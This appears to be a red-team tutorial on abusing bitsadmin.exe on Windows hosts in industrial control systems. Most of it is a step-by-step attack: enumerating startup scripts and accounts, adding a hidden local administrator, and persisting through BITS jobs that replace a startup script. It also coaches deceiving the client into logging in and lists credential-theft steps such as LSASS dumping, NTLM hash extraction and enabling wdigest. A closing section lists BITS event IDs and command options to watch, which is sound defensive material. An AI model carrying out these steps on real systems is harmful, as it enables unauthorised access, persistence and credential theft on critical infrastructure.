
## Some tricks and living off the land techniques in ICS
BITS Admin is a command and control tool to manage the BITS (Background Intelligent Transfer Service) service.
This tool can be used to create, download, or upload jobs and to mintor their progress.

Binary locations:
`C:\Windows\System32\bitsadmin.exe`
`C:\Windows\SysWoW64\bitsadmin.exe`

This can be interacted via PowerShell cmdlets.

### Technique 1
-Looking for startup script: `Get-item -path HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
-Looking at the content of files: `type $filepath`
-check permissions to see who can edit: `icacls $filepath`
-Account enumeration: `net user operator`

Well, let's append the file that starts up with below lines to add our own user to the machine:
 -Add a user: `net user /add mattdamon damon2021!`
 -Add the user to the localgroup admin: `net localgroup administrators mattdamon /add`

Now we can create jobs via BitsAdmin, add our own version of script instead or along the same startup script. So it always startup at the run time.
`bitsadmin.exe /create $jobname`
`bitsadmin.exe /addfile $jobsname C:\users\operator\desktop\$jobsfilename.bat C:\scripts\$jobscript.bat`
`bitsadmin.exe /resume $jobname`
`bitsadmin.exe /complete $jobname`
-make sure no other jobs are on queue:`bitsadmin.exe /reset`
double check the jobs file content: `type C:\scripts\$jobscript.bat`
Then at this point, you can ask the client/user to loginto machine and giving them some excuse that maybe we don't have access and just double check. When they login, our scripts will run and voilla, we can check with `whoami` or `net localgroup administrators` and see our **mattdamon** user is part of admin group.

So, now what we can do:
-We can enable the USB and port restrictions (if they are applied through GPOs)
-Interact with the LSAS and .exe process and create memory dumpt of it
-Extracting memory offline and dump NTLM hashes and maybe a **domain account** for lateral movement and harvesting for pass the hash activities
-We can extract SAMS HKey Local hives via impackets
-We can enable wdigest on the machine and reboot it and try capture credentials in clear text for next logon attempts

### Other Techniques
Other methods can be done such as:
1 - Downloading files from the internet or our machines and executing them.
2 - Replacing an existing legitimate DLL file with malicous one for future use with other living off the land biary,
3 - Replace rundll32.exe with a malicous file to call back to our C2
4 - Create one-liners to run a command or a sequence of them.

### Preventions:

1- Event IDs for Windows:
Event IDs 3 - BITS Service Created a new jobs
Event IDs 4 - The Trasnfer job is complete
Event IDs 5 - The job is cancelled
Event IDs 59 - BITS started the transfer job
Event IDs 60 - BITS stopped transferring the job
Event IDs 59/60 can also contain the download and/or upload URL that can be useful

2- Leveraging syslog, sysmon pay attention to the command options:
  -Transfer
  - Create
  - AddFile
  - SetNotifyFlags
  - SetNotidyCmdLine
  - SetMinRetryDelay
  - SetCustomHeaders
  - Resume
  Depending on the method the BITSAdmin was leveraged, powershell logs and admin logs could also be useful.
